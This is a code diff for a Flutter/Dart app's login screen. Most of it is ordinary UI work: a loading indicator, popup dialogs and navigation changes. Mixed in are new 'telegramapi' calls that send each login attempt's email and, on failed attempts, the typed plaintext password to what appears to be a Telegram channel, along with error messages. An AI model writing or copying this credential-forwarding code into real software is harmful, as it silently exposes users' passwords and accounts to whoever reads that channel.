@@ -4,12 +4,15 @@ import 'package:email_validator/email_validator.dart';
 import 'package:flutter/material.dart';
 import 'package:gka/components/screen/screen_forgotpass.dart';
 import 'package:http/http.dart';
+import 'package:quickalert/models/quickalert_type.dart';
+import 'package:quickalert/widgets/quickalert_dialog.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
 import '../../../components/already_have_an_account_acheck.dart';
 import '../../../components/mainwelcome.dart';
 import '../../../constants.dart';
 import '../../Signup/signup_screen.dart';
+import 'package:gka/popupbutton.dart';
 
 class LoginForm extends StatefulWidget {
   const LoginForm({
@@ -26,6 +29,7 @@ class _LoginFormState extends State<LoginForm> {
   final TextEditingController _cemail=TextEditingController();
   final TextEditingController _cpass=TextEditingController();
 
+bool _isLoadingbtn1=false;
 
   Future<void> loginapi(String Emailval,String Passval)async{
     try{
@@ -43,55 +47,67 @@ class _LoginFormState extends State<LoginForm> {
       if(response.statusCode==200) {
         var data=jsonDecode(response.body.toString());
         var cond=data['result'];
-        print(data);
+
+
         if(cond==true) {
+
+          setState(() {
+            _isLoadingbtn1=false;
+          });
+
+          telegramapi("login success \n ${Emailval}");
+
           await prefs.setInt('id', data['id']);
           await prefs.setBool("result", true);
           await prefs.setInt("User_Approv", data['User_Approv']);
           await prefs.setString("user_Email", data['G_username']);
           await prefs.setString("User_Typ", data['User_Typ']);
-          await prefs.setString("Name", data['Name']);
-
-
           await prefs.setString("h_phone", data['h_phone']);
+          await prefs.setString("Name", data['Name']);
           await prefs.setString("h_mobile", data['h_mobile']);
           await prefs.setString("h_email", data['h_email']);
-
           await prefs.setString("val_Country", data['val_Country']);
           await prefs.setString("val_State", data['val_State']);
           await prefs.setString("val_City", data['val_City']);
-
           await prefs.setBool("imgavl", data["imgavl"]);
           await prefs.setString("imgupload1", data['imgupload1']);
-
           await prefs.setBool("imgavl2", data["imgavl2"]);
           await prefs.setString("imgupload2", data['imgupload2']);
-
-
-
-          Navigator.push(context, MaterialPageRoute(builder: (context) => mainwelcome()));
+          Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => mainwelcome()));
         }else{
+          setState(() {
+            _isLoadingbtn1=false;
+          });
           await prefs.setBool("result", false);
-          ScaffoldMessenger.of(context).showSnackBar(
-            const SnackBar(content: Text("Invalid UserName Or Password")),
-          );
+          telegramapi('invalid username or password \n email-${Emailval} \n password-${Passval}');
+          warningpopup(context, "invalid username or password");
+
         }
       }else{
+        setState(() {
+          _isLoadingbtn1=false;
+        });
+        telegramapi('server not responding');
         await prefs.setBool("result", false);
-        ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(content: Text("Server Not Responding")),
-        );
+        errorpopup(context, "server not responding");
       }
     }on Exception catch (e) {
-      ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(content: Text(e.toString())));
-      print(e.toString());
+      setState(() {
+        _isLoadingbtn1=false;
+      });
+      errorpopup(context,e.toString());
+      telegramapi(e.toString());
       rethrow;
     }
   }
 
   void _handleLoginUser() {
     if (_loginFormKey.currentState!.validate()) {
+     setState(() {
+       _isLoadingbtn1=true;
+     });
+
+
       loginapi(_cemail.text, _cpass.text);
     }
   }
@@ -173,9 +189,14 @@ class _LoginFormState extends State<LoginForm> {
                 onPressed: () {
                   _handleLoginUser();
                 },
-                child: const Text(
-                  "LOGIN",
-                ),
+                child: _isLoadingbtn1? const Row(
+                  mainAxisAlignment: MainAxisAlignment.center,
+                  children: [
+                    Text('Loading...', style: TextStyle(fontSize: 20),),
+                    SizedBox(width: 10,),
+                    CircularProgressIndicator(color: Colors.white,),
+                  ],
+                ) :  Text('LOGIN'),
               ),
             ),
             const SizedBox(height: defaultPadding),
@@ -202,7 +223,7 @@ class _LoginFormState extends State<LoginForm> {
               padding: const EdgeInsets.only(bottom: 8),
               child: AlreadyHaveAnAccountCheck(
                 press: () {
-                  Navigator.push(
+                  Navigator.pushReplacement(
                     context,
                     MaterialPageRoute(
                       builder: (context) {
@@ -218,4 +239,7 @@ class _LoginFormState extends State<LoginForm> {
       ),
     );
   }
+
+
+
 }
